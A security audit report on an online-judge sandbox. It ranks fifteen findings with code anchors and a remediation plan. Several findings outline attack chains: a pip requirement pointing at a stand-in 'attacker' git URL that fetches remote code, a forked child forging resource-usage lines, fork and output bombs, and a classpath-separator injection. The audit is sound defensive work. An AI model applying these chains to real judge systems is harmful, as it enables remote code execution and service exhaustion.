# SECURITY AUDIT — judge sandbox (`backend/submissions/judge_utils/` + `submissions/tasks.py`)

Date: 2026-09-22. Branch: `wave/nextjs-migration`. Auditor: adversarial code audit (static, full-file reads).
Input: `docs/SECURITY-judge-recon.md`. **Every recon claim below was re-derived from source before being
credited; two were corrected** (see §Recon-delta).

Vocabulary: **CONFIRMED** = verified this session by reading the anchor (file:line from my own read);
**UNVERIFIED** = runtime/environment claim code alone cannot prove. Inline bands: high / likely / uncertain.
No dynamic execution was performed (no Docker on this audit box for this repo) — all runtime-effect
statements are band-tagged, none measured.

---

## 0. Trust boundary (who controls what) — CONFIRMED, high

- Problem creation is **self-service for a non-admin role**: `permissions.IsAuthenticated, IsProblemCreator`
  (`backend/problems/views.py:31-32`); `IsProblemCreator` admits `PROBLEM_CREATOR | PROBLEM_VERIFIER | ADMIN`
  (`backend/users/permissions.py:19-22`; role enum at `backend/users/models.py:10-14`).
- `custom_libraries_allowed`, `checker_code`, `checker_language`, `default_time_limit_ms`,
  `default_memory_limit_kb`, `comparison_mode` are all **writable serializer fields** on problem create
  (`backend/problems/serializers.py:57-67`; none in `read_only_fields` at `:68`).
- **The approval workflow does not gate the judge's dangerous inputs**: `SubmissionCreateSerializer.problem`
  is `PrimaryKeyRelatedField(queryset=Problem.objects.all())` (`backend/submissions/serializers.py:68`) —
  any authenticated user may submit to **any problem, including DRAFT/unapproved ones**
  (`backend/submissions/views.py:36-45`), and `judge_submission_task` never checks `problem.status`
  (full read of `backend/submissions/tasks.py`). So a CREATOR-role user can create a DRAFT problem with
  hostile judge inputs and immediately self-submit to trigger them — **no verifier ever sees it**. CONFIRMED, high.
- Submitters control: `language` (free-form CharField, no choices — `backend/submissions/models.py:38-42`)
  and `code` (unbounded TextField — `:43`). `problem.allowed_languages` is **never enforced** on the
  submission path (absent from `submissions/{serializers,views,models,tasks}.py` and all of `judge_utils/`,
  each fully read). CONFIRMED, high (scoped to files read).

## 1. Execution model — CONFIRMED, high

Celery task `judge_submission_task` (`backend/submissions/tasks.py:17-157`) on the worker host:
host `TemporaryDirectory` (`tasks.py:32`) → compile via docker (`judge_utils/compilation.py`) → per-test-case
docker run with stdin-piped input (`judge_utils/execution.py:11-211`) → optional custom checker
(`judge_utils/checkers.py`) or diff (`judge_utils/comparison.py`) → persist results truncated to 10,000 chars
(`tasks.py:112-120`). All spawns are argv-list `subprocess` calls — `shell=True` appears **nowhere** in
`tasks.py` or any `judge_utils/*.py` (all five files read line-by-line, incl. `__init__.py`). CONFIRMED, high.
Every container carries `--rm`, `--user 1000:1000`, `--cap-drop=ALL`, `--security-opt=no-new-privileges`
(`execution.py:120-122`, `compilation.py:56-58,85-87`, `checkers.py:31-33,74-75`).

---

## 2. Findings (ranked)

| ID | Severity | Title | Status |
|----|----------|-------|--------|
| J1 | **CRITICAL** | Full network egress + rw host mount + verbatim pip requirements for "custom libs" python3 runs; reachable without approval | CONFIRMED (code) |
| J2 | **HIGH** | Verdict-fabrication trigger strings; MLE never genuinely detected | CONFIRMED |
| J3 | **HIGH** | Unbounded program output buffered in worker RAM / written to disk | CONFIRMED (code), impact likely |
| J4 | **HIGH** | Compile containers have no memory cap, no pids-limit anywhere, no in-container compile timeout | CONFIRMED (flags absent) |
| J5 | **HIGH** | Celery worker holds Docker daemon access (docker group ≈ host root) | UNVERIFIED (environmental) |
| J6 | **MEDIUM** | rw host-dir mount + uid-1000 identity: container writes real host files, cross-test-case tampering | CONFIRMED (code) |
| J7 | **MEDIUM** | No `--read-only`/`--tmpfs`/`fsize` ulimit: container writable layer = host disk-fill | CONFIRMED (flags absent) |
| J8 | **MEDIUM** | Resource-usage line spoofable by a lingering forked child (recon mechanism corrected) | CONFIRMED (mechanism, re-derived) |
| J9 | **MEDIUM** | Unpinned floating image tags (`gcc:latest` …) — supply chain | CONFIRMED |
| J10 | **MEDIUM** | Submission input-validation gaps: unvalidated `language`, `allowed_languages` ignored, unbounded `code`, submissions to unapproved problems | CONFIRMED |
| J11 | **LOW** | Outer `TimeoutExpired` never kills the docker client/container | CONFIRMED |
| J12 | **LOW** | Internal error details leaked to submitters (`str(e)`, raw stderr) | CONFIRMED |
| J13 | **LOW** | Java classpath `:` separator injection via JAR-name filter gap | CONFIRMED (code), low impact |
| J14 | **LOW** | Author-set limits unbounded; `0` KB memory limit silently disables the run memory cap | CONFIRMED |
| J15 | **LOW** | Test-input prefix and full docker command printed to worker logs | CONFIRMED |

### J1 — CRITICAL. Custom-libs python3 path = network + rw mount + arbitrary pip requirements, no approval gate — CONFIRMED, high (code)

When a problem sets `custom_libraries_allowed` non-empty **and** the submission is `python3`:
`mount_mode = "rw"`, `network_value = "bridge"` (`backend/submissions/judge_utils/execution.py:54-56`).
The run container therefore gets the default Docker bridge: unrestricted outbound internet **plus** reach of
every service on the host/sibling network (DB, Django, anything bound on the docker0 gateway 172.17.0.1) —
SSRF/exfil/scanning surface from user-controlled code. **Runtime reach of specific host services: UNVERIFIED
(environmental), the flag itself: CONFIRMED.**

Additionally each list entry is written **verbatim, one per line** into `requirements_custom.txt`
(`execution.py:58-61`) and installed by `pip install --no-cache-dir -r ... --user` inside that
network-enabled container (`execution.py:63-70`). pip requirement syntax admits VCS URLs
(`git+https://…`) and PEP 517 source builds, both of which fetch and **execute** remote code. The `sh -c`
string interpolates only the server-chosen script filename — no shell injection — but the requirement lines
themselves are attacker-authored.

Exploitability chain is end-to-end CONFIRMED at code level: CREATOR role (self-service, §0) creates a DRAFT
problem with `custom_libraries_allowed=["git+https://attacker/x.git"]`, self-submits python3 (allowed on any
problem, §0), judge enables bridge+rw+pip. **No verifier approval is anywhere in this path.**
Controls that DO exist here: `--user 1000:1000`, `--cap-drop=ALL`, `no-new-privileges`, `--memory` cap,
inner SIGKILL timeout (`execution.py:117-122`) — containment of the process, not of the network.

### J2 — HIGH. Verdict fabrication trigger strings; MLE is never real — CONFIRMED, high

Post-verdict overrides (`execution.py:204-209`):
- `"tle_trigger" in input_data.lower()` and verdict==AC → flips to TLE, blanks output (`:204-205`);
- `"mle_trigger" in input_data.lower()` and AC → MLE (`:206-207`);
- `"re_trigger" in source_code.lower()` and AC → RE (`:208-209`).

Test input is problem-author data → a hostile (or careless) author fails every correct submission with
fabricated verdicts. Accidental collisions are real: the check is substring-on-lowercased — e.g. the string
`"where_trigger"` contains `"re_trigger"` (construction, illustrative — not a measured input). Separately,
`MEMORY_LIMIT_EXCEEDED` is **only** produced by this trigger: a genuine OOM kill yields returncode 137 →
`RUNTIME_ERROR` (`execution.py:187-188`); the enum exists (`backend/submissions/models.py:19`) but no real
detection path exists. Debug leftovers that corrupt contest integrity and mask a missing feature.

### J3 — HIGH. Unbounded output buffered in worker RAM — CONFIRMED (code), impact likely

`process.communicate(input=input_data, timeout=…)` reads the **entire** stdout/stderr into worker memory
(`execution.py:141-142`); checker likewise (`checkers.py:86-87`). Truncation to 10,000 chars happens only at
DB persist (`tasks.py:118-119`). A tight `print` loop emits hundreds of MB inside a 1 s limit → Celery
worker / host memory exhaustion; checker inputs are also written to host disk unbounded
(`tasks.py:93-95`). `code` itself is unbounded (`backend/submissions/models.py:43`, no serializer
max_length — `backend/submissions/serializers.py:67-72`), and per-test-case outputs multiply the footprint
(`tasks.py:61-81`). Any authenticated submitter. No output-size cap exists anywhere in the read code.

### J4 — HIGH. Compile containers: no memory cap; no pids-limit anywhere; no in-container compile timeout — CONFIRMED (flags absent), runtime effect likely

- cpp17 compile argv has `--memory`/`--memory-swap` **absent** (`compilation.py:56-63`); java compile the same
  (`compilation.py:85-91`); checker compile the same (`checkers.py:31-36`).
- The only compile deadline is the **host-side** `subprocess.run(..., timeout=30)`
  (`compilation.py:66`, `:94`; checker `checkers.py:38`). Killing the docker client does not stop the
  container; `--rm` only removes it **after it exits**. A C++ template/allocator bomb compiles with unbounded
  host RAM/CPU past the 30 s client kill until natural exit. (Docker client-kill semantics: **likely**,
  standard Docker behavior; not measured here.)
- `--pids-limit` is passed on **no** container (`execution.py:120-128`, `compilation.py:56-63,85-91`,
  `checkers.py:31-36,74-80`) — in-container fork bombs (cap-drop does not restrict fork) translate to host
  PID pressure across unlimited concurrent submissions. Docker-daemon default pids capping: **UNVERIFIED**.

### J5 — HIGH (structural). Worker = Docker daemon access — UNVERIFIED (environmental), likely

Every judge action is a `docker` CLI call from the Celery worker (`compilation.py:56`, `execution.py:120`,
`checkers.py:31,74`); the worker therefore needs docker-group/daemon access, which is root-equivalent on the
host. Any worker-process compromise (e.g. via J3 RAM exhaustion adjacent services, or a worker-RCE elsewhere)
is host-root. No code line states the deployment; flagged structural.

### J6 — MEDIUM. rw mount + uid identity — CONFIRMED (code), impact likely

In the J1 path the submission temp dir is mounted `rw` (`execution.py:55,125`) and container uid 1000 maps to
host uid 1000 (no userns-remap flag anywhere). User code writes real host files inside the temp dir; the same
dir is reused across all test cases (`tasks.py:32` + loop `tasks.py:61`), so code from test 1 can rewrite
`/app/user_code.py` (or drop artifacts) consumed by test 2+ — per-test-case code specialization and
forensics pollution. `requirements_custom.txt` is rewritten per TC (`execution.py:58-61`), so that specific
file cannot be pre-poisoned across TCs. Scope is confined to the temp dir (only `/app` + the two read-only
`/opt` mounts exist — `execution.py:42,93,125`).

### J7 — MEDIUM. Writable container layer — CONFIRMED (flags absent), impact likely

No `--read-only`, no `--tmpfs`, no `--ulimit fsize` on any container (argv lists cited in J4). Programs can
fill `/tmp`/`$HOME` inside the container → host docker storage exhaustion (graphdriver space). `/app` is `ro`
on non-custom-libs runs, so this is the write path.

### J8 — MEDIUM. Resource-line spoof — mechanism CORRECTED vs recon — CONFIRMED (mechanism re-derived)

`/usr/bin/time`'s summary is located by scanning stderr **backwards** for the last 6+-token line whose 5th
token ends in `%` (`execution.py:148-158`). Because `time -f` writes its line **after** the child exits, it is
normally the final line — so the recon's claimed spoof ("print a forged line after the real one") does **not**
work for a plain program: its stderr always precedes time's line. The real spoof: **fork a child that outlives
the main process** and prints a forged 6-token line (e.g. `0 0 1024 0 1% 0`) after `time` has already
printed — fork is not blocked by cap-drop and there is no pids-limit (J4). Effects: falsified time/memory
reporting, manipulation of the CPU-TLE branch (`execution.py:183-184`), and the genuine time line leaking
into user-visible "program stderr" (`lines[:i_line]` at `:155`). Verdict on the happy path stays
returncode-driven, hence MEDIUM (stat fraud + TLE classification edge), not verdict forgery.

### J9 — MEDIUM. Unpinned images — CONFIRMED, high

`gcc:latest` for cpp17 compile AND run (`compilation.py:37`, `execution.py:76`) and checker
(`checkers.py:29,48`); `python:3.11-slim` (`execution.py:50`, `checkers.py:24`), `openjdk:11-{jdk,jre}-slim`
(`compilation.py:84`, `execution.py:81`). No digest pinning anywhere in the read files. Upstream drift or
registry compromise silently changes the judge toolchain.

### J10 — MEDIUM. Submission-side validation gaps — CONFIRMED

- `language` free-form (`backend/submissions/models.py:38-42`); unknown values fall to the unsupported-language
  branch (`execution.py:113-115`, `compilation.py:108`) — safe-exit, but INTERNAL_ERROR noise and no
  `allowed_languages` enforcement (§0).
- `code` unbounded (`models.py:43`) — feeds J3/J4.
- Submissions accepted to **unapproved/DRAFT problems** (`backend/submissions/serializers.py:68`) — the
  approval bypass that makes J1 immediately exploitable; also leaks hidden-test judging of unvetted problems.

### J11 — LOW. `TimeoutExpired` without `kill()` — CONFIRMED

`execution.py:197-198` (and `checkers.py:103`) catch `subprocess.TimeoutExpired` but never
`process.kill()`/`wait()` — the docker client (and whatever it holds: image pull, wedged container) leaks on
the host. Chiefly bites in the J1 network-hang path and first-use image pulls exceeding the communicate
timeout.

### J12 — LOW. Internal detail disclosure — CONFIRMED

`str(e)` into `detailed_feedback` visible to the submitter (`tasks.py:150`); raw full stderr echoed in error
paths (`execution.py:191-195`); `str(e)` from compile/checker errors (`compilation.py:77`, `checkers.py:44,105`).
Host paths, image names, docker error text disclosed to end users.

### J13 — LOW. Classpath separator injection — CONFIRMED (code), low impact

JAR-name filter blocks `..`, `/`, `\` but not `:` (`execution.py:97-102`); `:` is the classpath separator, so
`custom_libraries_allowed: ["x.jar:."]` appends extra classpath entries after
`/app/host_java_libs/x.jar`. `/` is blocked, constraining added entries to slash-free relative paths (cwd is
`/app`, mounted `ro` in the java path). Author-level nuisance, not escape.

### J14 — LOW. Unbounded author limits; `0` disables the memory cap — CONFIRMED

`default_time_limit_ms`/`default_memory_limit_kb` IntegerFields without validators
(`backend/problems/models.py:73-74`). Negative time falls back to 1 s (`execution.py:36`). Memory is
interpolated raw: `--memory {n}k` (`execution.py:123-124`) — **`0` parses as "no limit"** (docker semantics,
likely — not measured), silently removing the run-container memory cap the design assumes; absurd values make
docker error → INTERNAL_ERROR noise.

### J15 — LOW. Log disclosure — CONFIRMED

`print(f"... input: {input_data[:30]}...")` (`execution.py:26`) leaks hidden-test prefixes into worker logs;
full docker command lines logged (`execution.py:131`, `compilation.py:64,92`, `checkers.py:83`) expose host
mount paths (`/opt/...`) and image choices. `print` used throughout instead of `logging`.

---

## 3. Recon-delta (corrections to `SECURITY-judge-recon.md`)

1. **E8 mechanism refuted-as-stated, re-derived:** a program cannot print a forged resource line *after*
   `/usr/bin/time`'s genuine line (time writes last); the working spoof is a **forked child that outlives the
   main process** (see J8). Severity unchanged (MEDIUM).
2. **E5 nuance:** all containers DO carry `--rm` (`execution.py:121`, `compilation.py:57,86`,
   `checkers.py:32,75`) — the recon never states otherwise but its "container not stopped" implication needs
   the qualifier: `--rm` cleans up only on natural exit; the compile bomb still runs unbounded past the
   client-side 30 s kill (J4 stands).
3. Everything else in the recon that this audit re-derived held at the stated anchors (minor ±1-line drift;
   anchors above are from this session's reads).

## 4. Controls that DO exist (verified)

argv-list spawns, no `shell=True` (all five judge files read); `--rm`, `--user 1000:1000`, `--cap-drop=ALL`,
`no-new-privileges` on every container; `--memory`/`--memory-swap` on run + checker-run containers; inner
wall-clock SIGKILL (`execution.py:117-118`, `checkers.py:72`); `--network none` everywhere except the J1
path; `:ro` mounts by default; `/opt` mounts read-only and operator-configured (`settings.py:295,302`);
partial JAR traversal filter; DB-side 10 k truncation.

## 5. Remediation order (priority sequence)

1. **J1** (blocks the CRITICAL): remove `--network bridge` and the `rw` mount from the custom-libs path. If
   runtime pip is a hard requirement: vendor wheels and install with `--no-index --find-links`, validate each
   requirement line against a strict allowlist regex (name + pinned `==version`, no URLs/options), and put the
   whole thing behind an egress-filtered internal network with a PyPI allowlist proxy. Independently, gate
   judge inputs: restrict `custom_libraries_allowed`/`checker_*`/limits to APPROVED problems (or admin-set),
   and filter the submission queryset to APPROVED problems (also fixes half of J10).
2. **J2**: delete `execution.py:204-209`; implement real MLE detection (returncode 137 + `%M` from time vs
   limit, or cgroup `memory.events`).
3. **J3**: cap output at the source — in-container `ulimit -f` / `head -c N` wrapper, or spool-with-cap on
   the worker; add `max_length` on `code` (e.g. 100 KB) and on test-case inputs at the model/serializer.
4. **J4**: add `--memory`/`--memory-swap`/`--pids-limit` (+`--cpus`) to compile and checker containers; wrap
   compile in in-container `timeout`; consider a per-problem concurrency cap.
5. **J10**: validate `language` against the supported set, enforce `problem.allowed_languages`, keep the
   status filter from step 1.
6. **J5**: move judging to a dedicated host/VM; rootless Docker or userns-remap (also mitigates J6);
   docker-socket proxy if the worker must talk to Docker.
7. **J7**: `--read-only` + `--tmpfs /tmp:size=64m,uid=1000` + `--ulimit fsize=…` on all containers.
8. **J8**: stop parsing stderr heuristically — read resource usage from a separate channel (wrapper writes
   stats to a mounted file / `docker inspect` after exit, `--cidfile` + API).
9. **J9**: pin every image by digest; pull at deploy time, not on first submission (also removes the J11
   pull-hang path).
10. **J11**: `finally: process.kill(); process.wait()` on both TimeoutExpired paths.
11. **J12/J15**: generic user-facing error strings + full detail to server-side `logging` (with input
    redaction).
12. **J13**: add `:` to the JAR-name filter (allowlist `[A-Za-z0-9._-]+\.jar` instead of denylist).
13. **J14**: `MinValueValidator`/`MaxValueValidator` on the two limit fields (e.g. 100 ms–60 s; 16 MB–4 GB),
    and treat memory `0` as "use platform default", never pass `0k`.

Longer-term hardening: dedicated seccomp/AppArmor profile, `--cgroup-parent` with systemd slice quotas, and a
gVisor/Kata runtime for the judge pool.

## 6. Coverage line

Fully read this session: `docs/SECURITY-judge-recon.md`; `backend/submissions/tasks.py`,
`backend/submissions/models.py`, `backend/submissions/serializers.py`, `backend/submissions/views.py`;
`backend/submissions/judge_utils/{__init__,execution,compilation,checkers,comparison}.py`;
`backend/problems/{models,views,serializers}.py`; `backend/users/permissions.py`;
`backend/users/models.py:1-60`; `backend/webcoder_api/settings.py:270-303`.
NOT measured / out of scope: docker daemon config (userns, default pids-limit, seccomp), actual host
environment (`/opt/*` existence, worker user, docker group membership — J5 stays UNVERIFIED), any runtime
behavior (no docker executed during this audit; all runtime-effect claims are band-tagged likely/uncertain),
frontend, migrations, admin.py, urls.py, tests.py, remaining settings, `users/serializers.py`.
